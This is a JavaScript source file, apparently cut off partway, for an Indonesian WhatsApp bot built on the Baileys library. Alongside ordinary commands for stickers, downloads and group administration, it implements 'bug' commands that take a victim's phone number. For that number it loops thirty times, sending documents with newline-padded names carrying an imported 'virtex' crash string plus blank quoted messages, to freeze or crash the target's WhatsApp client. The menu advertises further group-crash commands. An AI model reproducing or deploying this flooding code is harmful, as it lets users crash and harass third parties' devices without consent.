require("./setting")
const { baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@adiwajshing/baileys")
const { cekGrup, jsonformat } = require("./basexd/lib/myfunc")
const { getGroupAdmins, fetchJson, reSize, generateProfilePicture, sleep, getBuffer, isUrl, runtime, formatp, getRandom } = require("./basexd/lib/functions.js")
const { Configuration, OpenAIApi } = require("openai")
const { virtex1 } = require("./basexd/virtex/virtex1")
const { exec, spawn, execSync } = require("child_process")
const cheerio = require("cheerio")
const chalk = require("chalk")
const util = require("util")
const axios = require("axios")
const fs = require("fs")
const os = require("os")
const syntaxerror = require("syntax-error")
const Jimp = require("jimp")
const PhoneNumber = require("awesome-phonenumber")
const speed = require("performance-now")
const moment = require("moment-timezone")
const grup = JSON.parse(fs.readFileSync("./database/grup.json"))
const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"))
const antilink2 = JSON.parse(fs.readFileSync("./database/antilink2.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
//====================================================================//
module.exports = xd = async (xd, m, chatUpdate, store) => { 
try {
const type = getContentType(m.message)
const content = JSON.stringify(m.message)
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const qmsg = (quoted.m || quoted)
const mime = (quoted.m || quoted).mimetype || ''
const { fromMe } = m
const isMedia = /image|video|sticker|audio/.test(m.quoted ? m.quoted.mtype : m.mtype)
const body = (type === 'conversation' && m.message.conversation) ? m.message.conversation : (type == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (type == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (type == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (type == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
//====================================================================//
const isGroup = from.endsWith('@g.us')
const groupMetadata = isGroup? await xd.groupMetadata(m.chat).catch(e => {}) : ""
const groupName = isGroup? groupMetadata.subject : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participants = isGroup? await groupMetadata.participants : ""
const groupAdmins = isGroup? await participants.filter(v => v.admin !== null).map(v => v.id) : ""
const groupMembers = isGroup? groupMetadata.participants : ""
const isAdmins = isGroup? groupAdmins.includes(m.sender) : false
//====================================================================//
const botNumber = await xd.decodeJid(xd.user.id)
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const sender = m.key.fromMe ? (xd.user.id.split(':')[0]+'@s.whatsapp.net' || xd.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isOwner = ownerNomer.includes(senderNumber) || isBot
const isPrem = premium.includes(senderNumber) || isOwner || isBot
const jamwib = await moment.tz('Asia/Jakarta').format('HH')
const menitwib = await moment.tz('Asia/Jakarta').format('mm')
const detikwib = await moment.tz('Asia/Jakarta').format('ss')
const isAntiLink = antilink.includes(from) ? true : false
const isAntiLink2 = antilink2.includes(from) ? true : false
//====================================================================//
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]}
//====================================================================//
if (isGroup && isAntiLink && isBotAdmins){
if (body.includes(`https://chat.whatsapp.com/`)) {
if (!isBotAdmins) return reply(`Untung Bot Ga Jadi Admin`)
if (fromMe) return reply(`Bot Mah Bebas`)
if (isOwner) return reply(`Untung Lu Owner Gw`)
if (isAdmins) return reply(`Admin Group Mah Bebas Share Link 😂`)
await xd.sendMessage(from, { delete: m.key })
reply(`*Link Detect*\nSory Bro Link Nya Gw Hapus 😁`)
}}
//====================================================================//
if (isGroup && isAntiLink2 && isBotAdmins){
if (body.includes(`http://chat.whatsapp.com/`)) {
if (!isBotAdmins) return reply(`Untung Bot Ga Jadi Admin`)
if (fromMe) return reply(`Bot Mah Bebas`)
if (isOwner) return reply(`Untung Lu Owner Gw`)
if (isAdmins) return reply(`Admin Group Mah Bebas Share Link 😂`)
await xd.sendMessage(from, { delete: m.key })
reply(`*Link Detect*\nSory Bro Link Nya Gw Hapus 😁`)
}}
//====================================================================//
if (isCmd && m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); 
}
//====================================================================//
if (isCmd && !m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); 
}
//====================================================================//
let flok = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `RusBot WhatsApp`}}}
//====================================================================//
async function loading () {
var san = ["*Loading Done*"]
let { key } = await xd.sendMessage(from, {text: '*Wait Loading*'},{quoted: m})
for (let i = 0; i < san.length; i++) {
await xd.sendMessage(from, {text: san[i], edit: key });
}}
//====================================================================//
const stick = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net", 
...({ remoteJid: "" }) 
}, 
"message": { 
"stickerMessage": { 
"mimetype": "image/webp",
"jpegThumbnail": thumb
}}}
//====================================================================//
if (command) {
xd.sendPresenceUpdate('recording', from)}
//====================================================================//
const reply = (teks) => {
xd.sendMessage(from, { text: teks ,contextInfo:{forwardingScore: 9999999, isForwarded: true }}, { quoted : m })}
//====================================================================//
switch (command) {
case "menu": case "allmenu": {
const own = `${ownerNomer}@s.whatsapp.net`
let timestamp = speed()
let latensi = speed() - timestamp
ya = `𝗜𝗻𝗳𝗼 𝗕𝗼𝘁
».Owner : *@${own.split("@")[0]}*
».Versi Bot : *1.0.0*
».Bot Nama : *RusBot*
».Speed Bot : *${latensi.toFixed(4)}"
».Thanks To : *KirBotz (Base Bot)*

𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂
».tqto
».ping
».script
».owner
».donasi
».runtime
».murbug

𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂
».qc 
».tts
».ssweb
».sticker
».openai
».gitclone
».mediafire
».tiktokmp3
».tiktokmp4

𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂
».kick
».open
».close
».bctext
».revoke
».antilink
».hidetag
».antilink2
».linkgroup

𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂
».self
».join
».public
».delgc
».addgc
».idgroup
».delprem
».addprem
».setppbot

𝗕𝘂𝗴 𝗘𝗺𝗼𝗷𝗶
».🔥 *62xx*
».⚡ *62xx*
».😏 *62xx*
».🙏 *62xx*
».🌷 *62xx*
».🥶 *62xx*
».😎 *62xx*
».👻 *62xx*
».😉 *62xx*

𝗕𝘂𝗴 𝗚𝗿𝗼𝘂𝗽
».bomgc *linkgc*
».buggc *linkgc*
».virtexgc *linkgc*
».crashgc *linkgc*
».santetgc *linkgc*    
».mentalgc *linkgc*

𝗕𝘂𝗴 𝗢𝘁𝗵𝗲𝗿
».santet *62xx*
».bugtrol *62xx*
».gasbug *62xx*
».bugfour *62xx*
».bughole *62xx*
».bugdocu *62xx*
».sendvirtex *62xx*
».sendtrava *62xx*
».bugmental *62xx*
».sendphilips *62xx*
».bugdarknes *62xx*
`
await xd.sendMessage(from, {caption: ya, image: global.thumb, mentions:[own, sender]},{quoted: m})
}
break
//====================================================================//
case "baten": {
x = `Tes`
let buttons = [ {buttonId: `rules`, buttonText: {displayText: 'Rules'}, type: 1}]
let buttonMessage = {
image: { url: 'https://telegra.ph/file/24f0b977ce2c2bf3b3065.jpg' },
caption: `Bangz`,
footer: `${botNama}`,
buttons: buttons,
headerType: 4
}
xd.sendMessage(from, buttonMessage, { quoted: m })
}
break
//====================================================================//
case "biton": {
fac = `S`
xd.sendButtonText(from, [{ buttonId: 'Tesz', buttonText: { diplayText: 'Ff'}, type:1}], {quoted: m})
}
break
//====================================================================//
case "tts": case "gtts":{
try {
if (!q) return reply(`*Contoh ${command} Anda Siapa*`)
reply(mess.wait)
const gtts = require("./basexd/lib/gtts")(`id`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('*Teks Nya Kepanjangan Bro*')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
xd.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})}
)}} catch (err) {
console.log(err)
reply('*Maaf Terjadi Kesalahan*')
}
break
//====================================================================//
case "bctext": case "broadcasttext": case "broadcast": {
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`*Teks Nya Mana Bro?*`)
const data = await store.chats.all()
for (let i of data) {
xd.sendMessage(i.id, {text: `${q}` })
await sleep(1500)
}}
break
//====================================================================//
case "tqto": {
xx = `*Thanks To*
».Kirbotz
».Dan Creator Bot Lainya
`
xd.sendMessage(from, 
{text: xx, 
contextInfo: { 
forwardingScore: 9999999, 
isForwarded: true}}, {quoted: m})
}
break
//====================================================================//
case "donasi": {
xd.sendMessage(from, {image: qris, caption: ' '}, {quoted: m})
}
break
//====================================================================//
case "sanzi": {
fdd = `Woud`
xd.sendMessage(from, {text: fdd, contextInfo: { forwardingScore: 9999999, isForwarded: true}}, {quoted: m})
}
break
//====================================================================//
case "hidetag": case "h":
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.BotAdmin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
xd.sendMessage(from, { text: q ? q : '', mentions: mem })
break
//====================================================================//
case "owner": {
xd.sendContact(from, global.ownerNomer, flok)
}
break
//====================================================================//
case "ss": case "ssweb": {
if (!q) return reply(`*Contoh ${command} link*`)
reply(mess.wait)
let krt = await sswebb.ssweb(q)
xd.sendMessage(from, {image:krt.result,caption:'*Done*'}, {quoted:m})
}
break
//====================================================================//
case "kick": {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
if (!args[0]) return reply(`*Contoh ${command} Tag Orang Yang Mau Di Kick Nya*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xd.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(`*Sukses Mengkick Target*`)).catch((err) => reply(jsonformat(err)))
}
break
//====================================================================//
case "antilink": {
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!args[0]) return reply(`*Contoh ${command} off / on*\n*Contoh ${command} on*`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply(`*Antilink Sudah Aktif*`)
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply(`*Berhasil Mengaktifkan Antilink*`)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply(`*Antilink Belum Aktif*`)
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply(`*Berhasil Mengnonaktifkan Antilink*`)
} else { reply(`*Kata Kunci Salah*`) }
}
break
//====================================================================//
case "antilink2": {
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!args[0]) return reply(`*Contoh ${command} off / on*\n*Contoh ${command} on*`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink2) return reply(`*Antilink2 Sudah Aktif*`)
antilink2.push(from)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
reply(`*Berhasil Mengaktifkan Antilink2*`)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink2) return reply(`*Antilink2 Belum Aktif*`)
let anu = antilink2.indexOf(from)
antilink2.splice(anu, 1)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
reply(`*Berhasil Mengnonaktifkan Antilink2*`)
} else { reply(`*Kata Kunci Salah*`) }
}
break
//====================================================================//
case "revoke": {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !isOwner) return reply(mess.admin)
await xd.groupRevokeInvite(m.chat).then((res) => reply(`*Sukses Meriset Link Group*`)).catch((err) => reply(jsonformat(err)))
}
break
//====================================================================//
case "linkgroup": case "linkgc": {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
let response = await xd.groupInviteCode(m.chat)
reply("https://chat.whatsapp.com/" + response) 
}
break
//====================================================================//
case "sticker": case "s": {
if (!qmsg) return reply(`*Reply Gambar Dengan Caption ${command}*`)
if (/image/.test(mime)) {
reply(mess.wait) 
let media = await qmsg.download()
let encmedia = await xd.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((qmsg.m || qmsg).seconds > 11) return reply('*Durasi Video Nya Kepanjangan Maksimal 10 Detik*')
let media = await qmsg.download()
let encmedia = await xd.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
return reply(`*Reply Gambar Dengan Caption ${command}*`)
}}
break
//====================================================================//
case "tes": {
let timestamp = speed()
let latensi = speed() - timestamp
teks1 = `*Speed Bot :* ${latensi.toFixed(4)}`
xd.sendMessage(from, {text: teks1}, {quoted: flok})
}
break
//====================================================================//
case "join": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(`*Mana Link Group Nya?*`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return '*Link Nya Salah Bro*'
reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await xd.groupAcceptInvite(result).then((res) => reply(`*Berhasil*\n*Kalo Gabisa Berarti Group Nya Harus Di Setujui Gabung Dulu*`)).catch((err) => reply(jsonformat(err)))
}
break
//====================================================================//
case "ping": {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `*Kecepatan Respon ${latensi.toFixed(4)} _Second_* \n*Runtime : ${runtime(process.uptime())}*
*💻 Info Server*
*RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*
`
reply(respon)
}
break
//====================================================================//
case "tiktokmp4": case "tiktok": case "tiktokvideo": {
if (!text) return reply(`*Link Nya Mana Bro*`)
reply(mess.wait)
require("./basexd/lib/tiktok").Tiktok(q).then( data => {
xd.sendMessage(from, { caption: `*Ini Video Nya Kak @${sender.split("@")[0]}*`, video: { url: data.watermark }, footer: botNama, mentions: [m.sender] }, {quoted:m})
})}
break
//====================================================================//
case "tiktokmp3": case "tiktokaudio": {
if (!text) return reply(`*Link Nya Mana Bro?*`)
if (!args[0]) return reply(`*Contoh ${command} https://vt.tiktok.com/ZSLwQxcJ/*`)
reply(mess.wait)
require("./basexd/lib/tiktok").Tiktok(q).then( data => {
xd.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})}
break
//====================================================================//
case "mediafire": {
if (!text) return reply(`*Link Nya Mana Bro?*`)
reply(mess.wait)
const { mediafireDl } = require("./basexd/lib/mediafire.js")
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return reply('*File Over Limit* '+util.format(baby1))
xd.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(`*Fitur Sedang Eror*`))
}
break
//====================================================================//
case "gitclone": {
if (!text) return reply(`*Link Nya Mana Bro*?`)
reply(mess.wait)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
xd.sendMessage(from, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("*Done Bang*"))
}
break
//====================================================================//
case "script": case "sc": {
const noteg = `${ownerNomer}@s.whatsapp.net`
teksxx = `*Minta Ke @${noteg.split("@")[0]}, Kalo Di Kasih Hoki :V*`
xd.sendMessage(from, {text: teksxx, mentions:[noteg, sender]}, {quoted: flok})
}
break
//====================================================================//
case "murbug": {
const noteg = `${ownerNomer}@s.whatsapp.net`
tesh = `*Chat @${noteg.split("@")[0]}*`
xd.sendMessage(from, {text: tesh, mentions:[noteg, sender]}, {quoted: flok})
}
break
//====================================================================//
case "runtime": {
tekszx = `*Bot Aktif Selama :*\n${runtime(process.uptime())}`
reply(tekszx)
}
break
//====================================================================//
case "self": {
if (!isOwner) return reply(mess.owner)
xd.public = false
reply(`*Mode Self*`)
}
break
//====================================================================//
case "public": {
if (!isBot) return reply(mess.bot)
xd.public = true
reply(`*Mode Public*`)
}
break
//====================================================================//
case "idgroup": case "idgc": {
if (!isOwner) return reply(mess.owner)
fss = `${from}`
reply(fss)
}
break
//====================================================================//
case "open": {
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
xd.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`*Sukses Membuka Group*`)).catch((err) => reply(jsonformat(err)))
}
break
//====================================================================//
case "close": {
if (!isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
xd.groupSettingUpdate(from, 'announcement').then((res) => reply(`*Sukses Menutup Group*`)).catch((err) => reply(jsonformat(err)))
}
break
//====================================================================//
case "🔥": case "⚡": case "😏": case "🙏": case "🌷": case "🥶": case "😎": case "👻": case "😉": {
if (!isGroup) return reply(mess.group)
id = m.key.remoteJid
if (cekGrup(id,grup)) {
if (args.length < 1) return reply(`*Contoh ${command} 6285793433348*`)
num = `${text}`+`@s.whatsapp.net`
jumlah = "30"
let cek1 = await xd.onWhatsApp(num + `@s.whatsapp.net`)
if (cek1.length == 0) return reply(`*Nomer Ini Tidak Terdaftar Di WhatsApp*`)
reply(`*Berhasil Mengirim :* ${command}\n*Target :* ${text}\n*Jangan Lupa Jeda 5 Menit*`)
for (let i = 0; i < jumlah; i++) {
xd.sendMessage(num, { document: thumb, caption: " ", fileName: ` \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${virtex1}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: stick})
xd.sendMessage(num, {text: ` `}, {quoted: stick})
await sleep(1500)
xd.sendMessage(num, {text: ` `}, {quoted: stick})
await sleep(1500)
xd.sendMessage(num, {text: ` `}, {quoted: stick})
await sleep(1500)
xd.sendMessage(num, { document: thumb, caption: " ", fileName: ` \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${virtex1}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: stick})
}}else{
reply(`*Maaf Group Ini Tidak Tersedia Di Database Jadinya Gabisa Menggunakan Fitur Ini*`)}
}
break
//====================================================================//
case "santet": case "bugtrol": case "gasbug": case "bugfour": case "bughole": case "bugdocu": case "sendvirtex": case "sendtrava": case "bugmental": case "sendphilips": case "bugdarknes": {
if (!isGroup) return reply(mess.group)
id = m.key.remoteJid
if (cekGrup(id,grup)) {
if (args.length < 1) return reply(`*Contoh ${command} 6285793433348*`)
num = `${text}`+`@s.whatsapp.net`
jumlah = "30"
let cek2 = await xd.onWhatsApp(num + `@s.whatsapp.net`)
if (cek2.length == 0) return reply(`*Nomer Ini Tidak Terdaftar Di WhatsApp*`)
reply(`*Berhasil Mengirim :* ${command}\n*Target :* ${text}\n*Jangan Lupa Jeda 5 Menit*`)
for (let i = 0; i < jumlah; i++) {
xd.sendMessage(num, { document: thumb, caption: " ", fileName: ` \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${virtex1}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid"}, { quoted: stick})
xd.sendMessage(num, {text: ` `}, {quoted: stick})
await sleep(1500)
xd.sendMessage(num, {text: ` `}, {quoted: stick})
await sleep(1500)
xd.sendMessage(num, {text: ` `}, {quoted: stick})
await sleep(1500)
